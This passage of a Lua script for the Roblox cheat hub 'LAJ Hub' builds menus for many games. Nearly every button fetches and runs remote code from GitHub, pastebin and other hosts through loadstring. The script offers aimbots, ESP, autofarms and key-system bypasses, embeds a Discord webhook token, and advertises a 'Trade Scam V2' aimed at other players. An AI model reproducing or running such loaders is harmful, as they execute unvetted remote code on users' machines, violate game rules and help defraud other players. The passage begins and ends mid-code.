            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
            executednotify("Anti AFK")
        end
    end,
})

local Inf_jump = false
local jumpConnection = nil

Settings:CreateToggle({
   Name = "Infinite Jump",
   CurrentValue = false,
   Callback = function(Value)
      Inf_jump = Value
      
      -- Disconnect previous connection if it exists
      if jumpConnection then
          jumpConnection:Disconnect()
          jumpConnection = nil
      end
      
      -- Only create a new connection if Inf_jump is enabled and in game environment
      if Inf_jump and game then
          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
             if Inf_jump and game.Players.LocalPlayer.Character then
                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
             end
          end)
      end
   end,
})

-- Credit section
local creditSection = MainTab:CreateSection("Credits")

MainTab:CreateLabel("Created by LAJ Hub Team")
MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
MainTab:CreateLabel("Script Version: 4.4 (Swift Compatible)")
MainTab:CreateLabel("* Optimized for Swift Executor")

-- Print Swift compatibility notice
print("LAJ HUB - Swift Compatible Version")
print("All HTTP requests have been optimized for Swift executor")
print("This version includes:")
print("1. Full Swift compatibility")
print("2. Pet Sim 99 Tab with new Trade Scam V2")
print("3. New Doors Tab with 20+ scripts")
print("4. New Project Slayers Tab with SylveonHub & OniHub")
print("5. New Anime Dimensions Tab with 5 script options")
print("6. New King Legacy Tab with 7 script options")
print("7. New Arsenal Tab with 4 keyless scripts")
print("8. New Adopt Me Tab with 4 keyless scripts")
print("9. New Bed Wars Tab with 4 keyless scripts")
print("10. New Jailbreak Tab with 4 keyless scripts")
print("11. New Natural Disaster Tab with 4 keyless scripts")
print("12. New Phantom Forces Tab with 4 keyless scripts")
print("13. New Blade Ball Tab with 4 keyless scripts")
print("14. New Shindo Life Tab with 4 keyless scripts")
print("15. New Fishing Simulator Tab with 4 keyless scripts") 
print("16. New Big Paintball Tab with 4 keyless scripts")
print("17. New Pet Simulator 99 Tab with 4 keyless scripts")
print("18. All scripts updated to work with Swift")
print("19. Improved executor detection")

-- Rivals Tab
Rivals:CreateSection("Rivals Scripts")
 
Rivals:CreateButton({
   Name = "Azure Mod",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
        executednotify("Azure Mod")
   end,
})

Rivals:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
        executednotify("Tbao Hub")
   end,
})

Rivals:CreateButton({
   Name = "8Bits Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
        executednotify("8Bits Hub")
   end,
})

Rivals:CreateButton({
   Name = "Venox Hub",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
        executednotify("Venox Hub")
   end,
})

Rivals:CreateButton({
   Name = "Lunax Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
        executednotify("Lunax Hub")
   end,
})

Rivals:CreateButton({
   Name = "Ventures.lua",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/laeraz/ventures/refs/heads/main/rivals.lua"))()
        executednotify("Ventures.lua")
   end,
})

Rivals:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/b581d07bfd134ff4ea612d671361be77.lua"))()
        executednotify("Ronix Hub")
   end,
})

Rivals:CreateButton({
   Name = "PinguinRVS",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/PUSCRIPTS/PINGUIN/refs/heads/main/RivalsV1"))()
        executednotify("PinguinRVS")
   end,
})

Rivals:CreateButton({
   Name = "Zypherion",
   Callback = function()
        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
        executednotify("Zypherion")
   end,
})

Rivals:CreateButton({
   Name = "Auto Farm Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/212c1198a1beacf31150a8cf339ba288.lua"))()
        executednotify("Auto Farm Hub")
   end,
})

Rivals:CreateButton({
   Name = "Rybow Aimbot",
   Callback = function()
        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
        executednotify("Rybow Aimbot")
   end,
})

Rivals:CreateButton({
   Name = "Xera Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/luascriptsROBLOX/Xerar/refs/heads/main/RivalsxeraPBF"))()
        executednotify("Xera Script")
   end,
})

Rivals:CreateButton({
   Name = "Minimal Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MinimalScriptingService/MinimalRivals/main/rivals.lua",true))()
        executednotify("Minimal Hub")
   end,
})
-- Dead Rails Tab
DeadRails:CreateSection("Dead Rails Scripts")

DeadRails:CreateButton({
   Name = "Markk Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
       executednotify("Markk Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "Farx11122 Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
       executednotify("Farx11122 Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "SpiderXHub Keyless",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
       executednotify("SpiderXHub Keyless")
   end,
})
DeadRails:CreateButton({
   Name = "Strelizia Keyless",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
       executednotify("Strelizia Keyless")
   end,
})

DeadRails:CreateButton({
   Name = "Rinns Dead Rails No Key",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
       executednotify("Rinns Dead Rails No Key")
   end,
})

DeadRails:CreateButton({
   Name = "Auto Farm Bond",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
       executednotify("Auto Farm Bond")
   end,
})

DeadRails:CreateButton({
   Name = "Lomu Hub",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
       executednotify("Lomu Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Neox Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
       executednotify("Neox Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Sypher Hub OP",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
       executednotify("Sypher Hub OP")
   end,
})

DeadRails:CreateButton({
   Name = "Tbao Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
       executednotify("Tbao Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Karol Hub",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
       executednotify("Karol Hub")
   end,
})

DeadRails:CreateButton({
   Name = "Dead Rails Alpha Script",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
       executednotify("Dead Rails Alpha Script")
   end,
})

DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
       executednotify("Airflow UPDATED")
   end,
})

DeadRails:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
       executednotify("Airflow UPDATED")
   end,
})

-- Project Slayers Tab
ProjectSlayers:CreateSection("⚔️ PROJECT SLAYERS SCRIPTS 🥷")

ProjectSlayers:CreateButton({
   Name = "SylveonHub - AutoFarm, Kill Aura",
   Callback = function()
       local LoaderUrl = "https://raw.githubusercontent.com/ogamertv12/SylveonHub/main/Mobile.lua"
       loadstring(game:HttpGet(LoaderUrl))()
       executednotify("SylveonHub - Project Slayers")
   end,
})

ProjectSlayers:CreateButton({
   Name = "OniHub - ESP, No Cooldown",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Phyoue/Wlymalfrr/main/Wlymalfrr"))()
       executednotify("OniHub - Project Slayers")
   end,
})

-- Anime Dimensions Tab
AnimeDimensions:CreateSection("🌟 ANIME DIMENSIONS SIMULATOR SCRIPTS 🌠")

AnimeDimensions:CreateButton({
   Name = "NoName Hub - Auto Farm, Raid",
   Callback = function()
       loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/Essenly/NoName-Hub/main/Loader.lua'))()
       executednotify("NoName Hub - Anime Dimensions")
   end,
})

AnimeDimensions:CreateButton({
   Name = "Mobile Script - Auto Play, Dodge",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Yanwanlnwza/SmellLikeHacker/main/Animedimensions.lua"))()
       executednotify("Mobile Script - Anime Dimensions")
   end,
})

AnimeDimensions:CreateButton({
   Name = "Auto Farm, Raid, Speed Raid",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/minhhau207/SilverHub/main/Protected_9892584729983615.lua"))()
       executednotify("Auto Farm Script - Anime Dimensions")
   end,
})

AnimeDimensions:CreateButton({
   Name = "Zelphoria Script - Auto Level",
   Callback = function()
       loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/fleowo/Bubble/request/Loader.lua"))()
       executednotify("Zelphoria Script - Anime Dimensions")
   end,
})

AnimeDimensions:CreateButton({
   Name = "Zelphoria352 - Auto Farm, Skills",
   Callback = function()
       loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/Essenly/NoName-Hub/main/init.lua'))()
       executednotify("Zelphoria352 Script - Anime Dimensions")
   end,
})

-- King Legacy Tab
KingLegacy:CreateSection("👑 KING LEGACY SCRIPTS 🏝️")

KingLegacy:CreateButton({
   Name = "Tsuo Hub - Auto Farm Level, Near Farm, More",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Tsuo7/TsuoHub/main/king%20legacy"))()
       executednotify("Tsuo Hub - King Legacy")
   end,
})

KingLegacy:CreateButton({
   Name = "Hyper Hub - Auto Skill, Farm, Level",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/DookDekDEE/Hyper/main/script.lua"))()
       executednotify("Hyper Hub - King Legacy")
   end,
})

KingLegacy:CreateButton({
   Name = "Arc Hub - Farm Hack UPDATED",
   Callback = function()
       getgenv().CustomDistance = 10 -- For Bug Can't Swipe Distance
       loadstring(game:HttpGet("https://raw.githubusercontent.com/ChopLoris/ArcHub/main/main.lua"))()
       executednotify("Arc Hub - King Legacy")
   end,
})

KingLegacy:CreateButton({
   Name = "Zee Hub - AutoFarm GUI Mobile",
   Callback = function()
       loadstring(game:HttpGet('https://zuwz.me/Ls-Zee-Hub-KL'))()
       executednotify("Zee Hub - King Legacy")
   end,
})

KingLegacy:CreateButton({
   Name = "Hulk Hub - Mobile Hack",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/HULKUexe/mobileX/main/FreeScript.lua"))()
       executednotify("Hulk Hub - King Legacy")
   end,
})

KingLegacy:CreateButton({
   Name = "BT Project - Auto Stats, Farm Nearest",
   Callback = function()
       loadstring(game:HttpGetAsync("https://lua-library.btteam.net/script-auth.txt"))()
       executednotify("BT Project - King Legacy")
   end,
})

KingLegacy:CreateButton({
   Name = "Philippine Hub - AutoFarm, Stats, Farm Mode",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/PrintH3lloW0rld/Philippine-hub/main/Philippine%20Hub%201.0"))()
       executednotify("Philippine Hub - King Legacy")
   end,
})

-- Arise Crossover Tab
-- Arise Crossover Bypass Implementation
local ariseCrossoverBypassActive = false

-- Function to activate the Arise Crossover bypass
local function activateAriseCrossoverBypass()
    if ariseCrossoverBypassActive then return true end
    
    local originalHttpGet = game.HttpGet
    
    -- Function to check if a URL is related to Arise Crossover
    local function isAriseCrossoverURL(url)
        if string.match(url:lower(), "arisecrossover") or 
           string.match(url:lower(), "arise") then
            return true
        end
        return false
    end
    
    -- Hook the HttpGet function to bypass key check for Arise Crossover scripts
    game.HttpGet = function(self, url, ...)
        local result = originalHttpGet(self, url, ...)
        
        -- If this is an Arise Crossover URL, log the bypass
        if isAriseCrossoverURL(url) then
            print("LAJ HUB: Arise Crossover script detected, keyless access enabled")
        end
        
        return result
    end
    
    -- Show notification
    Rayfield:Notify({
        Title = "LAJ HUB Arise Crossover",
        Content = "Keyless access enabled for Arise Crossover tab",
        Duration = 5,
        Image = 4483362458,
    })
    
    ariseCrossoverBypassActive = true
    return true
end

-- Activate the bypass when tab loads
activateAriseCrossoverBypass()

AriseCrossover:CreateSection("Arise Crossover Scripts (Keyless)")

AriseCrossover:CreateButton({
   Name = "Arise Crossover Script",
   Callback = function()
       -- Ensure bypass is active before executing
       if activateAriseCrossoverBypass() then
           loadstring(game:HttpGet("https://raw.githubusercontent.com/alicee-idk/arisecrossover/refs/heads/main/README.md"))()
           executednotify("Arise Crossover Script")
       end
   end,
})

AriseCrossover:CreateButton({
   Name = "Auto Mobs Script",
   Callback = function()
       -- Ensure bypass is active before executing
       if activateAriseCrossoverBypass() then
           loadstring(game:HttpGet("https://raw.githubusercontent.com/IAmJamal10/Scripts/refs/heads/main/AriseCrossover"))()
           executednotify("Auto Mobs Script")
       end
   end,
})

AriseCrossover:CreateButton({
   Name = "Auto Dungeon, Auto Farm, Auto Boss",
   Callback = function()
       -- Ensure bypass is active before executing
       if activateAriseCrossoverBypass() then
           loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86de6d175e585ef6c1c7f4bdebfc57cc.lua"))()
           executednotify("Auto Dungeon, Auto Farm, Auto Boss")
       end
   end,
})

-- BloxFruits Tab Scripts
BloxFruits:CreateSection("Blox Fruits Scripts")

-- Doors Tab Scripts
DoorsTab:CreateSection("🚪 DOORS HORROR GAME SCRIPTS 👁️")

DoorsTab:CreateButton({
   Name = "Kodbol Hub",
   Callback = function()
       loadstring(game:HttpGet(('https://pastefy.app/awczkDwJ/raw'),true))()
       executednotify("Kodbol Hub for Doors")
   end,
})

DoorsTab:CreateButton({
   Name = "Tool Giver (Mobile)",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/Darli17/Entities/refs/heads/main/Tools"))()
       executednotify("Tool Giver for Doors Mobile")
   end,
})

DoorsTab:CreateButton({
   Name = "Kitty Cats - Items, Speed, Shears",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/CatEnddroid/Kitty-Cats-Doors-Beta/refs/heads/main/hub.lua"))()
       executednotify("Kitty Cats Doors Script")
   end,
})

DoorsTab:CreateButton({
   Name = "BlackKing GUI",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
       executednotify("BlackKing Doors GUI")
   end,
})

DoorsTab:CreateButton({
   Name = "Pandemonium Mode",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/DripCapybara/Doors-Mode-Remakes/refs/heads/main/PandemoniumProtected.lua"))()
       executednotify("Pandemonium Mode")
   end,
})

DoorsTab:CreateButton({
   Name = "T1 Hub - Items",
   Callback = function()
       loadstring(game:HttpGet("https://pastebin.com/raw/HT8jgqAY"))()
       executednotify("T1 Hub Items Script")
   end,
})

DoorsTab:CreateButton({
   Name = "Golden Gummy Flashlight",
   Callback = function()
       loadstring(game:HttpGet(("https://raw.githubusercontent.com/aadyian9000/the-thing/main/GoldenGummyFlashlight.lua"),true))()
       executednotify("Golden Gummy Flashlight")
   end,
})

DoorsTab:CreateButton({
   Name = "Moon Bottle",
   Callback = function()
       loadstring(game:HttpGet('https://gist.githubusercontent.com/IdkMyNameLoll/04d7dd5e02688624b958b8c2604b924c/raw/9e86b34249f44ed2dd433176e67daaf3db30cde8/MoonBottle'))()
       executednotify("Moon Bottle")
   end,
})

DoorsTab:CreateButton({
   Name = "Seek Gun",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/main/seekgun.lua"))()
       executednotify("Seek Gun")
   end,
})

DoorsTab:CreateButton({
   Name = "Rocket Launcher",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/main/rocketLauncher.lua"))()
       executednotify("Rocket Launcher")
   end,
})

DoorsTab:CreateButton({
   Name = "Black Hole",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/iimateiYT/Scripts/main/Black%20Hole.lua"))()
       executednotify("Black Hole")
   end,
})

DoorsTab:CreateButton({
   Name = "Auto Farm Candy & ESP",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/LHking123456/Dhjfdr9hk/refs/heads/main/Doors"))()
       executednotify("Auto Farm Candy & ESP")
   end,
})

DoorsTab:CreateButton({
   Name = "Sensation - Auto Farm",
   Callback = function()
       loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/730854e5b6499ee91deb1080e8e12ae3.lua"))()
       executednotify("Sensation Auto Farm")
   end,
})

DoorsTab:CreateButton({
   Name = "MS Paint GUI",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua"))()
       executednotify("MS Paint GUI")
   end,
})

DoorsTab:CreateButton({
   Name = "Leaf Hub Mobile",
   Callback = function()
       loadstring(game:HttpGet("https://pastebin.com/raw/wbJTDuKw"))()
       executednotify("Leaf Hub Mobile")
   end,
})

DoorsTab:CreateButton({
   Name = "ESP & Skip Level",
   Callback = function()
       loadstring(game:HttpGet("https://pastebin.com/raw/h8Gvq7k3", true))()
       executednotify("ESP & Skip Level")
   end,
})

DoorsTab:CreateButton({
   Name = "Devil's Hub",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/doors/main/devilshubgui"))()
       executednotify("Devil's Hub")
   end,
})

DoorsTab:CreateButton({
   Name = "Modez - Doors Modes",
   Callback = function()
       loadstring(game:HttpGet('https://raw.githubusercontent.com/no12356/doors-modes-room-and-floor/main/doors%20modes%20and%20floors'))()
       executednotify("Modez - Doors Modes")
   end,
})

DoorsTab:CreateButton({
   Name = "Auto Finish, No Jumpscares",
   Callback = function()
       loadstring(game:HttpGet(('https://pastebin.com/raw/9QPGnLx6'),true))()
       executednotify("Auto Finish, No Jumpscares")
   end,
})

DoorsTab:CreateButton({
   Name = "FFJ Hub",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
       executednotify("FFJ Hub")
   end,
})

DoorsTab:CreateButton({
   Name = "DarkCheatClient",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/VaniaPerets/FolderGui-FolderHub/main/loader.lua", true))()
       executednotify("DarkCheatClient")
   end,
})

DoorsTab:CreateButton({
   Name = "Apple Hub",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTienNguyenZ/AppleHubOnTop/main/Loader.lua"))()
       executednotify("Apple Hub")
   end,
})

DoorsTab:CreateButton({
   Name = "BlackKing X BobHub",
   Callback = function()
       loadstring(game:HttpGetAsync("https://pastebin.com/raw/R8QMbhzv"))()
       executednotify("BlackKing X BobHub")
   end,
})

-- Murder Mystery Tab Content 
MurderMystery:CreateSection("🔪 MURDER MYSTERY 2 SCRIPTS 🔫") 

MurderMystery:CreateLabel("Select a script to load for MM2") 

-- Load the mm2_scripts module for all Murder Mystery 2 script functionality
local MM2Scripts = loadstring(game:HttpGet("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/mm2_scripts.lua"))()

-- Main Discord Button
MurderMystery:CreateButton({ 
    Name = "Join Discord for Updates", 
    Callback = function() 
        setclipboard("https://discord.gg/4mgdcfvAJU") 
        Rayfield:Notify({ 
            Title = "Discord Link Copied", 
            Content = "The Discord link has been copied to your clipboard!", 
            Duration = 5, 
            Image = 9725800107, 
            Actions = { 
                Ignore = { 
                    Name = "OK", 
                    Callback = function() end 
                } 
            } 
        }) 
    end 
})

-- Express Hub
MurderMystery:CreateButton({
    Name = "Express Hub MM2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AscendFromHeaven/Kitsune-Hub/refs/heads/main/WhitelistMM2"))()
        executednotify("Express Hub MM2")
    end,
})

-- Solix Hub
MurderMystery:CreateButton({
    Name = "Solix Hub MM2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/debunked69/Solixreworkkeysystem/refs/heads/main/solix%20new%20keyui.lua"))()
        executednotify("Solix Hub MM2")
    end,
})

-- Foggy Hub
MurderMystery:CreateButton({
    Name = "Foggy Hub (ESP, X-Ray)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/mm2-piano-reborn/refs/heads/main/scr"))()
        executednotify("Foggy Hub MM2")
    end,
})

-- YHUB Mobile
MurderMystery:CreateButton({
    Name = "YHUB Mobile MM2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/YHUB-Community/refs/heads/main/Murder-Mystery2"))()
        executednotify("YHUB MM2 Mobile")
    end,
})

-- Forge Hub
MurderMystery:CreateButton({
    Name = "Forge Hub (Auto Farms)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
        executednotify("Forge Hub MM2")
    end,
})

-- Auto Collect SnowToken
MurderMystery:CreateButton({
    Name = "Auto Collect SnowToken",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/mm2"))()
        executednotify("MM2 Snow Token Collector")
    end,
})

-- Candy Farm
MurderMystery:CreateButton({
    Name = "Candy Farm MM2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vexroxd/My-Script-/refs/heads/main/MM2-Candy-Farm"))()
        executednotify("MM2 Candy Farm")
    end,
})

-- Mobile Auto Farm
MurderMystery:CreateButton({
    Name = "Mobile Auto Farm",
    Callback = function()
        _G.AutofarmSettings = {
            AntiAfk = true, 
            DelayFarm = 2.15,
            ResetWhenFullBag = true,
            CoinType = "BeachBall",
            Disable3DRendering = false,
            ImproveFPS = false,
            StartAutofarm = true
        }
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NoCapital2/MM2Autofarm/main/script"))()
        executednotify("MM2 Mobile Auto Farm")
    end,
})

-- Vertex MM2
MurderMystery:CreateButton({
    Name = "Vertex MM2",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
        executednotify("Vertex MM2")
    end,
})

-- Admin Panel
MurderMystery:CreateButton({
    Name = "Admin Panel",
    Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/e89Mn4Ec'))()
        executednotify("MM2 Admin Panel")
    end,
})

-- Mars Hub
MurderMystery:CreateButton({
    Name = "Mars Hub MM2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/1andonlymars/MarsHub/main/MM2"))()
        executednotify("Mars Hub MM2")
    end,
})

-- Symphony Hub (Mobile)
MurderMystery:CreateButton({
    Name = "Symphony Hub (Mobile)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Thattsick/Symphony-Hub/main/Arrayfields"))()
        executednotify("Symphony Hub MM2")
    end,
})

BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "THUNDER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
        executednotify("THUNDER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "LAJ HUB USE THIS",
   Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/blox%20fruts"))()
        executednotify("LAJ HUB USE THIS")
   end,
})

BloxFruits:CreateButton({
   Name = "LAJ HUB DIRECT BYPASS",
   Callback = function()
        -- Direct bypass loader with webhook support
        local webhookUrl = "https://discord.com/api/webhooks/1228111003954954301/HHjzJ4jGV8GZbcH5U93j-OkGp6Qb3IEmCodDY-XHrX5wVLe0qUJp0P9X8pBMgwdEOXrr"
        
        -- Set up configuration variables (these would normally be set by key system)
        if getgenv then
            getgenv()._G = getgenv()._G or {}
            _G.AutoFarm = true
            _G.MaxLevel = 2550
        end
        
        -- Show notification if in Roblox
        if game and game:GetService("StarterGui") then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "LAJ HUB",
                Text = "Loading script directly (no key required)...",
                Duration = 3
            })
        else
            print("LAJ HUB: Would load script directly now")
            return
        end
        
        -- Directly load from GitHub, bypassing the key system
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/main/BF"))()
        executednotify("LAJ HUB DIRECT BYPASS")
   end,
})

BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
        executednotify("MUXUS Hub")
   end,
})


BloxFruits:CreateButton({
   Name = "Uranium Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
        executednotify("Uranium Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Azure Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
        executednotify("Azure Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Vector Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
        executednotify("Vector Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Wolf Hub",
   Callback = function()
        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
        executednotify("Wolf Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "Payback Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
        executednotify("Payback Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "RIPPER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
        executednotify("RIPPER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "KAY Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
        executednotify("KAY Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
        executednotify("SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MATSUNE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
        executednotify("MATSUNE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MIN SEAGATE Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
        executednotify("MIN SEAGATE Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "ZINER Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
        executednotify("ZINER Hub")
   end,
})

BloxFruits:CreateButton({
   Name = "MUXUS Hub",
   Callback = function()
